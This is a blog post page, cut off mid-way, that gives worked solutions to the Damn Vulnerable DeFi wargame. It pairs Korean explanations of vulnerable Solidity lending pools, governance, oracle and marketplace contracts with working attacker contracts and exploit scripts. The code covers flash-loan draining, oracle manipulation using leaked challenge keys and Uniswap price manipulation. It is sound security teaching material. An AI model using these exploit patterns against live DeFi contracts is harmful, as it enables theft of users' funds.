<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>[Solution] Damn Vulnerable DeFi | inhack</title>
<meta name="keywords" content="solidity, smart contract, security, DeFi, wargame, CTF">
<meta name="description" content="Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions">
<meta name="author" content="inhack">
<link rel="canonical" href="https://inhack.github.io/posts/solution-damn-vulnerable-defi/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.d7fb4cbf980fe688a21621b06a795933c4e6bb2d4070ec940667af1715d84af2.css" integrity="sha256-1/tMv5gP5oiiFiGwanlZM8Tmuy1AcOyUBmevFxXYSvI=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js" integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://inhack.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://inhack.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://inhack.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://inhack.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://inhack.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://inhack.github.io/posts/solution-damn-vulnerable-defi/">
<link rel="alternate" hreflang="kr" href="https://inhack.github.io/kr/posts/solution-damn-vulnerable-defi/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="[Solution] Damn Vulnerable DeFi" />
<meta property="og:description" content="Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://inhack.github.io/posts/solution-damn-vulnerable-defi/" /><meta property="og:image" content="https://inhack.github.io/papermod-cover.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-11T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-01-11T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://inhack.github.io/papermod-cover.png"/>

<meta name="twitter:title" content="[Solution] Damn Vulnerable DeFi"/>
<meta name="twitter:description" content="Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://inhack.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "[Solution] Damn Vulnerable DeFi",
      "item": "https://inhack.github.io/posts/solution-damn-vulnerable-defi/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "[Solution] Damn Vulnerable DeFi",
  "name": "[Solution] Damn Vulnerable DeFi",
  "description": "Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions",
  "keywords": [
    "solidity", "smart contract", "security", "DeFi", "wargame", "CTF"
  ],
  "articleBody": " ‘Damn Vulnerable DeFi’ is an offensive security playground for decentralized finances.\nThis article offers a brief summary and exploit code of each challenge.\nFor detailed source code and contents, please check my github repository.\n # 1. Unstoppable Summary Flash Loan을 제공하고 있는 Lending Pool을 대상으로 DoS 공격을 통해 기능을 멈추게하는 것이 목표이다.\nFlash Loan?\n Flash Loan은 간단하게 설명하자면 ‘무담보’ 대출로, 보통 사용자는 대출 풀에 소정의 수수료를 지급하고(물론 트랜잭션 실행에 대한 가스비도 소모) 토큰을 대출할 수 있다.\n대출한 토큰을 가지고 다른 DeFi 서비스에 투자를 하던, 에어드랍 보상을 위한 스테이킹을 하던, 사용자가 상환 이전까지 사용할 수 있다.\n하지만 Flash Loan의 대출-상환 프로세스는 ‘단일’ 트랜잭션에서 이루어져야 하며, 상환 과정에서 대출받은 토큰만큼의 수량을 Pay Back하지 않는 경우 해당 트랜잭션이 revert된다.\nrevert가 된다는 것은 해당 트랜잭션이 블록에 포함되지 않아 PoW/PoS 등의 거래증명이 완료되지 않기 때문에, State Transition이 발생하지 않는다.\n말이 어려운데 그냥 원금을 돌려놓지 않으면, 대출-상환 사이에 토큰을 옮기든 무엇을 하든 트랜잭션 revert로 인해 대출 실행 이전의 상태로 원복된다는 것이다.(수수료나 가스비만 소모)\n 이더리움에서는 계정(컨트랙트 및 EOA)을 대상으로 강제로 Ether를 송신할 수 있으므로\nuint256 balanceBefore = damnValuableToken.balanceOf(address(this)); require(balanceBefore = borrowAmount, \"Not enough tokens in pool\"); // Ensured by the protocol via the `depositTokens` function assert(poolBalance == balanceBefore); 와 같이 컨트랙트의 balance를 엄격하게 확인하는 코드를 작성하는 경우에 주의해야 한다.\n위 코드로 인해 Lending Pool의 계좌 잔액이 1 wei만 늘어나더라도, assert()에 의해 이후의 코드가 실행되지 않는 DoS 상태로 빠질 수 있다.\nExploit unstoppable.challenge.js\nawait this.token.connect(attacker).transfer(this.pool.address, 1); // forcibly send 1 wei to lending pool  # 2. Naive receiver Summary Flash Loan을 제공하는 Lending Pool에서 대출 수수료로 1 ETH를 청구한다. 해당 Lending Pool을 이용하는 특정 사용자의 balance(10 ETH)를 drain하는 것이 목표이다.\n// NaiveReceiverLenderPool.sol ... // msg.sender가 borrower인지 검증하는 로직이 없음 - 공격자가 임의의 사용자의 컨트랙트에 있는 잔고를 고갈시킬 수 있음(수수료 사용) function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant { // (1) Flash Loan 컨트랙트의 잔액이 borrowAmount에 비해 충분한지 확인  uint256 balanceBefore = address(this).balance; require(balanceBefore = borrowAmount, \"Not enough ETH in pool\"); // (2) 대출자인 borrower가 컨트랙트인지 확인(not EOA)  require(borrower.isContract(), \"Borrower must be a deployed contract\"); // borrower.receiveEther() 호출  // Transfer ETH and handle control to receiver  borrower.functionCallWithValue( abi.encodeWithSignature( \"receiveEther(uint256)\", FIXED_FEE ), borrowAmount ); require( address(this).balance = balanceBefore + FIXED_FEE, \"Flash loan hasn't been paid back\" ); } ... 위 코드를 보면 확인할 수 있듯이, flashLoan() 을 호출하여 대출을 실행하는 사용자인 msg.sender가 borrower인지 검증하는 로직이 없어, 공격자가 임의의 사용자 주소를 borrower에 입력하여 호출이 가능하다.\nExploit naive-receiver.challenge.js\nfor(let i=0;i10;i++){ await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0')); }  # 3. - Truster Summary Flash Loan을 기반으로 DTV 토큰을 무료로 대출해주는 Lending Pool이 있으며, 해당 Lending Pool은 100만개의 DTV 토큰을 가지고 있다. 해당 Lending Pool로부터 모든 DTV 토큰을 공격자의 계정으로 옮기는 것이 목표이다.\n... // functionCall()을 이용하여 target 컨트랙트의 및 특정 함수를 호출하는 코드로 인해, 공격자는 어떠한 함수든 호출이 가능 function flashLoan( uint256 borrowAmount, address borrower, address target, bytes calldata data ) external nonReentrant { uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); require(balanceBefore = borrowAmount, \"Not enough tokens in pool\"); damnValuableToken.transfer(borrower, borrowAmount); target.functionCall(data); // Vulnerable : target 및 data를 이용해 함수 호출 - 어떠한 함수든 호출이 가능한 상황  uint256 balanceAfter = damnValuableToken.balanceOf(address(this)); require(balanceAfter = balanceBefore, \"Flash loan hasn't been paid back\"); } ... target.functionCall(data); 에 의해 현재 어떠한 함수든 사용자가 호출이 가능한 상황이다.\nrequire(balanceAfter = balanceBefore, \"Flash loan hasn't been paid back\"); 구문 우회를 위해, approve() 함수를 호출하도록하여 Lending Pool-공격자로 토큰 전송을 승인해두고 flashLoan() 호출 이후에 transferFrom()을 이용해 Lending Pool의 모든 토큰을 공격자의 계정으로 가져올 수 있다.\nExploit truster.challenge.js\nconst ABI = [\"function approve(address, uint256)\"]; const interface = new ethers.utils.Interface(ABI); const payload = interface.encodeFunctionData(\"approve\", [attacker.address, TOKENS_IN_POOL.toString()]); await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, payload); // token.approve() : lending pool - attacker await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);  # 4. Side entrance Summary 누구나,언제든 ETH를 예치/인출할 수 있는 Lending Pool이 있다.\n해당 Lending Pool은 1,000 ETH의 balance를 가지고 있으며, 프로모션으로 예치된 ETH를 자유롭게 대출할 수 있는 Flash Loan 서비스를 제공하고 있다.\n공격자는 해당 Lending Pool로부터 모든 ETH를 가져와야 한다.\n// SideEntranceLenderPool contract SideEntranceLenderPool { using Address for address payable; mapping (address = uint256) private balances; // ETH deposit(예치) 기능 제공  // Vulnerable : ETH 수신 여부와 상관없이 balance를 증가시킴  function deposit() external payable { balances[msg.sender] += msg.value; } // ETH withdraw(인출) 기능 제공  function withdraw() external { uint256 amountToWithdraw = balances[msg.sender]; balances[msg.sender] = 0; payable(msg.sender).sendValue(amountToWithdraw); } /** * @notice Flash Loan 기능으로 사용자에게 원하는 만큼의 ETH를 대출 * @param amount 대출할 ETH의 수량 * @dev 대출을 요청한 사용자 컨트랙트의 execute() 함수를 호출 - execute */ function flashLoan(uint256 amount) external { uint256 balanceBefore = address(this).balance; require(balanceBefore = amount, \"Not enough ETH in balance\"); IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); require(address(this).balance = balanceBefore, \"Flash loan hasn't been paid back\"); } } 대출을 요청한 사용자 컨트랙트의 execute() 함수를 실행하며, msg.value를 통해 대출한 ETH 토큰을 전달한다.\ndeposit() 함수는 ETH를 사용자에게 수신했는지 여부와 상관없이 balance를 증가시키도록 취약한 형태로 작성되어 있다.\n공격자는 내부적으로 deposit()을 호출하여 대출한 ETH를 Lending Pool에 예치하는 execute() 함수 및 컨트랙트를 호출한 뒤, flashLoan() 실행이 종료된 이후에 withdraw()를 통해 ETH를 가져올 수 있다.\n (1) flashLoan()을 통해 대출한 ETH를 다시 deposit()하여 공격자의 balances를 증가시킨다.  deposit()이 예치한 사용자의 ETH 전송 여부는 확인하지 않기 때문에, 대출한 토큰으로 balances만 증가시키고 다시 상환   (2) 공격자는 withdraw()를 호출하여 Lending Pool의 ETH를 가져온다.  Exploit attacker-contracts/FlashLoanEtherReceiver.sol\n// SPDX-License-Identifier: MIT  pragma solidity ^0.8.0; import \"../side-entrance/SideEntranceLenderPool.sol\"; contract FlashLoanEtherReceiver { SideEntranceLenderPool private immutable pool; address payable private immutable attacker; constructor(address payable poolAddress, address payable attackerAddress) { pool = SideEntranceLenderPool(poolAddress); attacker = attackerAddress; } function execute() external payable { pool.deposit{value: msg.value}(); } function executeFlashLoan() external { // attack - increase attacker's balances  pool.flashLoan(address(pool).balance); pool.withdraw(); // send drained ether to attacker  attacker.transfer(address(this).balance); } // Allow deposits of ETH  receive () external payable {} } side-entrance.challenge.js\nconst FlashLoanEtherReceiver = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker); this.receiver = await FlashLoanEtherReceiver.deploy(this.pool.address, attacker.address); await this.receiver.executeFlashLoan();  # 5. The rewarder Summary DTV 토큰을 예치한 사용자에게 5일마다 한번씩 리워드 토큰을 보상해주는 Reward Pool이 있다. (라운드마다 100개의 리워드 토큰을 보상하며, 예치한 비율에 따라 분배)\n현재 Alice, Bob, Charile, David 4명이 사용자가 각각 100개의 DTV 토큰을 예치한 상태이며, Reward Round 2에서 각각 25개씩의 Reward를 수령하였다.\n공격자는 DTV 토큰을 하나도 가지고 있지 않은 상태에서, Reward Round 3에서 가장 많은 Reward Token을 수령하는 것이 목표이다.\n100만개의 DTV 토큰을 보유하고 있는 FlashLoanderPool로부터 대출받은 토큰을 Reward Pool에 예치하여 리워드 토큰을 수령하면 된다.\nExploit attacker-contracts/FlashLoanTheRewarder.sol\n// SPDX-License-Identifier: MIT  pragma solidity ^0.8.0; import \"@openzeppelin/contracts/utils/Address.sol\"; interface IFlashLoanerPool { function flashLoan(uint256 amount) external; } interface IDamnValuableToken { function approve(address spender, uint256 amount) external returns (bool); function transfer(address recipient, uint256 amount) external returns (bool); function balanceOf(address) external returns (uint256); } interface IRewarderPool { function deposit(uint256 amountToDeposit) external; function withdraw(uint256 amountToWithdraw) external; function distributeRewards() external returns (uint256); } interface IRewardToken { function transfer(address recipient, uint256 amount) external returns (bool); function balanceOf(address) external returns (uint256); } contract FlashLoanTheRewarder { using Address for address payable; address payable private lenderPool; //address payable private liquidityToken;  address payable private rewarderPool; address payable private attacker; address payable private rewardToken; address payable private liquidityToken; uint256 public testUint; constructor (address payable _lenderPool, address payable _liquidityToken, address payable _rewardToken, address payable _rewarderPool, address payable _attacker) { lenderPool = _lenderPool; //liquidityToken = _liquidityToken;  liquidityToken = _liquidityToken; rewarderPool = _rewarderPool; rewardToken = _rewardToken; attacker = _attacker; } function receiveFlashLoan(uint256 amount) external { require(msg.sender == lenderPool, \"Sender must be pool\"); // Flashloan Borrow : Receive liquidity token(DTV) from LenderPool(flashloan)  uint256 amountToBeRepaid = amount; IDamnValuableToken(liquidityToken).approve(rewarderPool, amountToBeRepaid); IRewarderPool(rewarderPool).deposit(amountToBeRepaid); IRewarderPool(rewarderPool).withdraw(amountToBeRepaid); // Flashloan Repayment : Pay back to LenderPool(flashloan)  IDamnValuableToken(liquidityToken).transfer(lenderPool, amountToBeRepaid); } function execFlashLoans(uint256 amount) external { IFlashLoanerPool(lenderPool).flashLoan(amount); IRewardToken(rewardToken).transfer( msg.sender, IRewardToken(rewardToken).balanceOf(address(this)) ); } receive () external payable {} } the-rewarder.challenge.js\nconst FlashLoanTheRewarder = await ethers.getContractFactory('FlashLoanTheRewarder', attacker); this.attackerContract = await FlashLoanTheRewarder.deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewardToken.address, this.rewarderPool.address, attacker.address); // Next Reward Round! await ethers.provider.send(\"evm_increaseTime\", [5 * 24 * 60 * 60]); // 5 days  await this.attackerContract.execFlashLoans(ethers.utils.parseEther('1000000')); //console.log(await this.attackerContract.check()); console.log(await this.rewarderPool.roundNumber()); // for (let i = 0; i // console.log(await this.rewardToken.balanceOf(users[i].address)); // } console.log(await this.rewardToken.balanceOf(attacker.address));  # 6. Selfie Summary Flash Loan을 제공하며 거버넌스 메커니즘을 기반으로 제어가 가능한 150만개의 DTV 토큰을 보유하고 있는 Lending Pool이 있다.\n공격자는 0개의 DTV 토큰을 가지고 있으며, 해당 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이다.\n// SelfiePool.sol ... /** * @notice 컨트랙트(펀드)에 있는 모든 토큰 잔액을 해당 주소로 전송 (governance만 해당 함수 호출 가능) * @param receiver 모든 토큰 잔액을 전송할 대상 주소 */ function drainAllFunds(address receiver) external onlyGovernance { uint256 amount = token.balanceOf(address(this)); token.transfer(receiver, amount); emit FundsDrained(receiver, amount); } ... Flash Loan 컨트랙트에는 거버넌스만이 실행할 수 있으며 지정된 계정으로 모든 토큰을 보내는 drainAllFunds() 함수를 제공하고 있다.\n// SimpleGovernance.sol ... /** * @notice 거버넌스 큐에 실행할 작업을 적재 * @param receiver 작업을 실행할 컨트랙트의 주소 * @param data 작업에 사용할 calldata(함수 이름, 인자 등) * @return 큐에 적재된 작업의 식별자(actionId) */ function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) { require(_hasEnoughVotes(msg.sender), \"Not enough votes to propose an action\"); // 큐에 작업을 추가하기 위해서는 전체 토큰 발행량의 절반 이상을 가지고 있어야 함  require(receiver != address(this), \"Cannot queue actions that affect Governance\"); // governance 컨트랙트 내 함수는 실행하지 못함  uint256 actionId = actionCounter; GovernanceAction storage actionToQueue = actions[actionId]; actionToQueue.receiver = receiver; actionToQueue.weiAmount = weiAmount; actionToQueue.data = data; actionToQueue.proposedAt = block.timestamp; // 작업이 큐에 적재된 시간(timestamp)  actionCounter++; emit ActionQueued(actionId, msg.sender); return actionId; } ... /** * @notice 거버넌스 큐에 적재된 작업 실행 * @param actionId 실행할 작업의 식별자(actionId) */ function executeAction(uint256 actionId) external payable { // _canBeExecuted()에 의해 (1) 아직 실행된 적이 없고(executedAt==0), (2) 큐에 적재된지 2일 이상이 지난 작업만 실행 가능  require(_canBeExecuted(actionId), \"Cannot execute this action\"); GovernanceAction storage actionToExecute = actions[actionId]; actionToExecute.executedAt = block.timestamp; actionToExecute.receiver.functionCallWithValue( actionToExecute.data, // address target  actionToExecute.weiAmount // bytes memory data  ); emit ActionExecuted(actionId, msg.sender); } 해당 거버넌스 메커니즘은 총 200만개가 발행된 DTV 토큰 중에서, 100만개를 초과한 토큰을 가진 계정만이 Lending Pool을 제어할 수 있는 action을 queue에 삽입할 수 있다.\nFlash Loan으로부터 150만개의 토큰(총 발행량의 과반이 넘는 토큰양)을 대출한 뒤, 거버넌스 큐에 drainAllFunds() 함수를 실행하는 action을 삽입한다.\n이후 queue에 있는 action을 실행하여 Lending Pool의 모든 토큰을 공격자의 계정으로 옮길 수 있다.\nExploit attacker-contracts/FlashLoanSelfie.sol\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"@openzeppelin/contracts/utils/Address.sol\"; interface IDamnValuableToken { function transfer(address recipient, uint256 amount) external; function transferFrom(address sender, address recipient, uint256 amount) external; function approve(address spender, uint256 amount) external; function balanceOf(address account) external returns (uint256); } interface IDamnValuableTokenSnapshot { function snapshot() external returns (uint256); function getBalanceAtLastSnapshot(address account) external view returns (uint256); function getTotalSupplyAtLastSnapshot() external view returns (uint256); } interface ISimpleGovernance { function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256); function executeAction(uint256 actionId) external payable; function getActionDelay() external view returns (uint256); } interface ISelfiePool { function flashLoan(uint256 borrowAmount) external; function drainAllFunds(address receiver) external; } contract FlashLoanSelfie { using Address for address payable; address payable public attacker; address payable public token; address payable public governance; address payable public lenderPool; uint256 public actId; constructor (address payable _attacker, address payable _token, address payable _governance, address payable _lenderPool) { attacker = _attacker; token = _token; governance = _governance; lenderPool = _lenderPool; } function receiveTokens(address _tokenAddress, uint256 _borrowAmount) external { // Flash loan borrow  IDamnValuableTokenSnapshot(_tokenAddress).snapshot(); actId = ISimpleGovernance(governance).queueAction(lenderPool, abi.encodeWithSignature(\"drainAllFunds(address)\", attacker), 1); // Flash loan repayment : pay back to flash loan  IDamnValuableToken(_tokenAddress).transfer(lenderPool, _borrowAmount); } function executeFlashLoans(uint256 _amount) external { ISelfiePool(lenderPool).flashLoan(_amount); } receive() external payable {} } selfie.challenge.js\nconst FlashLoanSelfieFactory = await ethers.getContractFactory('FlashLoanSelfie', attacker); this.exploit = await FlashLoanSelfieFactory.deploy(attacker.address, this.token.address, this.governance.address, this.pool.address); await this.exploit.connect(attacker).executeFlashLoans(ethers.utils.parseEther(\"1500000\")); await ethers.provider.send(\"evm_increaseTime\", [2 * 24 * 60 * 60]); // 2 days  await this.governance.executeAction(0);  # 7. Compromised Summary “DVNFT\"라는 NFT를 거래하는 마켓이 있으며, 해당 NFT는 개당 999 ETH에 판매되고 있다.\nNFT의 판매 가격은 3개의 Trusted Reporter가 설정한 가격의 median 값을 사용하고 있다.\nNFT 마켓은 9990 ETH, 공격자는 0.1 ETH를 보유하고 있는 상황에서 마켓이 가진 모든 ETH를 가져오는 것이 목표이다.\n해당 마켓으로부터 다음과 같은 on-chain 데이터가 유출되었다.\nHTTP/2 200 OK content-type: text/html content-language: en vary: Accept-Encoding server: cloudflare 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 유출된 두개의 데이터는 2개의 Trusted Reporter 계정의 개인키(Private Key)이므로, 해당 개인키를 이용해 NFT 마켓의 NFT 가격을 낮게 설정하는 트랜잭션을 송신함으로써 시세 조작이 가능하다.\n// TrustfulOracle.sol ... function _computeMedianPrice(string memory symbol) private view returns (uint256) { uint256[] memory prices = _sort(getAllPricesForSymbol(symbol)); // calculate median price if (prices.length % 2 == 0) { uint256 leftPrice = prices[(prices.length / 2) - 1]; uint256 rightPrice = prices[prices.length / 2]; return (leftPrice + rightPrice) / 2; } else { return prices[prices.length / 2]; } } ... Trusted Reporter가 설정한 가격이 홀수인 경우 prices[prices.length / 2]와 같이 median price를 계산한다.\n공격자는 3개중 2개의 개인키를 가지고 있기 때문에, 원하는대로 median price를 조작하는 것이 가능하다.\nExploit compromised.challenge.js\n// load wallet/signer from Private Key  // Leaked Hex Data - Base64Decode // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 let privKey1 = \"0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9\"; var wallet1 = new ethers.Wallet(privKey1, ethers.provider); // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 let privKey2 = \"0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48\"; var wallet2 = new ethers.Wallet(privKey2, ethers.provider); // Makret Manipulation (Price to low) await this.oracle.connect(wallet1).postPrice(\"DVNFT\", ethers.utils.parseEther(\"0.01\")); await this.oracle.connect(wallet2).postPrice(\"DVNFT\", ethers.utils.parseEther(\"0.01\")); // buy await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther(\"0.01\")}); // Makret Manipulation (Price to high) await this.oracle.connect(wallet1).postPrice(\"DVNFT\", ethers.utils.parseEther(\"9990.01\")); await this.oracle.connect(wallet2).postPrice(\"DVNFT\", ethers.utils.parseEther(\"9990.01\")); console.log(await this.oracle.getAllPricesForSymbol(\"DVNFT\")); console.log(await this.oracle.getMedianPrice(\"DVNFT\")); // approve \u0026 sell await this.nftToken.connect(attacker).approve(this.exchange.address, 0); await this.exchange.connect(attacker).sellOne(0); // price recovery await this.oracle.connect(wallet1).postPrice(\"DVNFT\", ethers.utils.parseEther(\"999\")); await this.oracle.connect(wallet2).postPrice(\"DVNFT\", ethers.utils.parseEther(\"999\"));  # 8. Puppet Summary 100,000 DTV 토큰을 보유한 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이며, 공격자는 25 ETH / 1,000 DTV를 가지고 있는 상태로 시작한다.\nUniswap V1을 기반으로 구축된 Puppet Pool DEX(DEcentralized eXchange)가 있으며, 10 DTV / 10 ETH 의 초기 유동성이 공급되고 있다.\n100,000 DTV 토큰을 보유하고 담보 대출을 해주는 Lending Pool이 있으며, Uniswap V1의 AMM(CPMM, Constants Product Market Maker)을 Price Oracle로 사용하고 있다.\n 정확히는 Uniswap V1에서 받아오는 Price Oracle의 x2 가격을 담보로 설정하여 DTV 토큰을 대출해준다. 초기 Uniswap V1의 유동성은 10 DTV / 10 ETH이기 때문에, CPMM에 의해 Price Oracle은 1이며, Lending Pool로부터 1 DTV를 대출하려면 2 ETH를 담보로 전송해야 한다.  공격자는 자신이 가진 DTV를 Uniswap V1 Pool에 있는 ETH와 Swap하여 Price Oracle 즉 DTV 토큰의 상대적인 가격을 임의로 낮출 수 있다. (1 DTV 당 대출에 필요한 ETH 가격이 낮아짐)\n CPMM 기반 Uniswap V1 Pool에 충분한 유동성이 공급되지 않는 경우, 토큰의 가격을 조작할 수 있다. (안정적인 가격 유지를 위해 충분한 유동성이 공급되어야 한다.)\n Exploit puppet.challenge.js\nawait this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther(\"990\")); await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(ethers.utils.parseEther(\"990\"), ethers.utils.parseEther(\"1\"), (await ethers.provider.getBlock('latest')).timestamp * 2, attacker.address); let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther(\"1\"))); let numOfEths = priceOracle.mul(100000).add(1); await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther(\"100000\"), {value: numOfEths});  # 9. Puppet v2 Summary Puppet과 동일하게 적은 유동성에 따른 토큰 가격 조작에 대한 위험이 있으며, Uniswap V2 업데이트에 따른 인터페이스(Wrapped ETH, Swap Router Path 등)만 맞춰주면 된다.\nExploit puppet-v2.challenge.js\n// Swap DTV - ETH let stamp = (await ethers.provider.getBlock('latest')).timestamp * 2; await this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.utils.parseEther(\"9999\")); await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ethers.utils.parseEther(\"9999\"), ethers.utils.parseEther(\"1\"), [this.token.address, this.weth.address], attacker.address, stamp); // lending! // attacker eth - weth convert let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther(\"1\"))); let numOfWeths = priceOracle.mul(1000001) await this.weth.connect(attacker).deposit({value: numOfWeths}); await this.weth.connect(attacker).approve(this.lendingPool.address, numOfWeths); // steal! await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther(\"1000000\"));  # 10. Free rider Summary DVNFT를 거래할 수 있는 마켓이 있고, 해당 마켓에는 초기에 발행된 6개의 NFT가 각각 15 ETH에 판매되고 있다.\n해당 마켓에 있는 모든 NFT가 drain될 수 있는 취약점이 있는데, buyer는 방법을 몰라 공격자에게 의뢰한 상황이다.\n공격자는 0.5 ETH로 시작하며, 해당 마켓으로부터 6개의 NFT 토큰을 빼와 buyer에게 전달하면 대가로 45 ETH를 받을 수 있다.\nFreeRiderNFTMArketplace.sol의 _buyOne()에 취약점이 존재한다.\nNFT를 15 ETH에 구매한 buyer에게 토큰을 전송한 뒤 원래 owner인 seller에게 15 ETH의 금액을 전송해야하는데, 다음 코드처럼 새로운 owner인 buyer에게 금액을 전송하게 된다.\n- 공격자는 15 ETH 만 있으면 마켓내 모든 NFT 토큰을 구매할 수 있다.\n// FreeRiderNFTMArketplace.sol ... function _buyOne(uint256 tokenId) private { uint256 priceToPay = offers[tokenId]; require(priceToPay  0, \"Token is not being offered\"); require(msg.value = priceToPay, \"Amount paid is not enough\"); amountOfOffers--; // Vulnerability : NFT를 safeTransferFrom(token.ownerOf(tokenId))로 보내면, 해당 NFT 토큰의 owner가 새 buyer로 바뀐다  // 그 이후에 token.ownerOf(tokenId).sendValue() 호출 시 지불금액이 seller가 아닌 buyer에게 다시 돌아감!  // transfer from seller to buyer  token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId); // pay seller  payable(token.ownerOf(tokenId)).sendValue(priceToPay); // vulnerable  emit NFTBought(msg.sender, tokenId, priceToPay); } ... 공격자는 0.5 ETH 밖에 없기 때문에, UniswapV2의 Flash Swap을 이용하여 ETH를 대출하여 마켓내 모든 NFT 토큰을 가져올 수 있다.\n (1) UniswapV2 Flash Swap을 통해 15 ETH 대출 (Borrow) (2) 취약점을 이용하여 마켓내 모든 NFT 토큰 drain (3) UniswapV2 Flash Swap에 15 ETH 상환 (Pay Back) (4) 모든 NFT 토큰을 buyer에게 전송하여, 45 ETH 수령  Exploit attacker-contracts/FlashLoanFreeRider.sol\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\"; interface IUniswapV2Pair { // token0 : weth  // token1 : DTV  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external; } interface IWETH9 { function balanceOf(address) external returns (uint); function deposit() external payable; function withdraw(uint wad) external; function transfer(address dst, uint wad) external returns (bool); } interface IFreeRiderNFTMarketplace { function buyMany(uint256[] calldata tokenIds) external payable; } interface IERC721 { function safeTransferFrom(address from, address to, uint256 tokenId) external; } contract 